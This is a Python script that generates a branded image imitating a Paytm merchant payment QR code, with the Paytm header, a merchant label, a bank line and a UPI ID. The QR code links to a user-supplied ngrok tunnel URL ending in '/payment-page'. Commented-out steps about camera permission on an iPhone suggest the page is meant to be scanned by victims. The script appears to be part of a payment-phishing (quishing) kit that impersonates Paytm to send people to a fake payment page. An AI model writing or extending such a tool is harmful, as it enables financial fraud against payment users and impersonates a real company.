import qrcode
from PIL import Image, ImageDraw, ImageFont

def generate_qr():
    print("\n" + "="*60)
    print("PAYTM QR CODE GENERATOR")
    print("="*60)
    
    print("\n📡 After running 'ngrok http 5000'")
    print("   Copy the HTTPS forwarding URL (e.g., https://abc123.ngrok.io)")
    ngrok_url = input("\nEnter your ngrok HTTPS URL: ").strip()
    
    url = f"{ngrok_url}/payment-page"
    
    print(f"\n[+] QR URL: {url}")
    
    qr = qrcode.QRCode(
        version=3,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=12,
        border=4,
    )
    qr.add_data(url)
    qr.make(fit=True)
    
    qr_img = qr.make_image(fill_color="black", back_color="white").convert('RGB')
    
    final_img = Image.new('RGB', (600, 750), 'white')
    draw = ImageDraw.Draw(final_img)
    
    try:
        font_title = ImageFont.truetype("arial.ttf", 32)
        font_name = ImageFont.truetype("arial.ttf", 22)
        font_detail = ImageFont.truetype("arial.ttf", 14)
        font_small = ImageFont.truetype("arial.ttf", 12)
    except:
        font_title = font_name = font_detail = font_small = ImageFont.load_default()
    
    # Paytm header
    draw.rectangle([(0, 0), (600, 80)], fill="#00b9f5")
    draw.text((300, 40), "Paytm", fill="white", anchor="mt", font=font_title)
    
    # QR Code
    qr_size = 400
    qr_img = qr_img.resize((qr_size, qr_size))
    final_img.paste(qr_img, (100, 100))
    
    # Merchant details - Changed to Merchant Account
    draw.text((300, 530), "Merchant Account", fill="#333", anchor="mt", font=font_name)
    draw.text((300, 560), "Paytm Payments Bank - 9876", fill="#666", anchor="mt", font=font_detail)
    draw.text((300, 582), "UPI: merchant@paytm", fill="#888", anchor="mt", font=font_detail)
    
    draw.line([(80, 610), (520, 610)], fill="#e0e0e0", width=1)
    draw.text((300, 635), "Scan with Paytm App", fill="#00b9f5", anchor="mt", font=font_detail)
    
    filename = "paytm_qr.png"
    final_img.save(filename)
    
    #print(f"\n[✓] QR saved as: {filename}")
    #print("\n📱 ON IPHONE - CHROME:")
    #print(f"   1. Open Chrome")
    #print(f"   2. Go to: {ngrok_url}")
    #print(f"   3. Tap lock icon → Camera → Allow")
    #print(f"   4. Tap 'Scan QR Code' → 'Start Camera'")
    #print(f"   5. Scan this QR code")
    #print("\n" + "="*60)
    
    return filename

if __name__ == "__main__":
    generate_qr()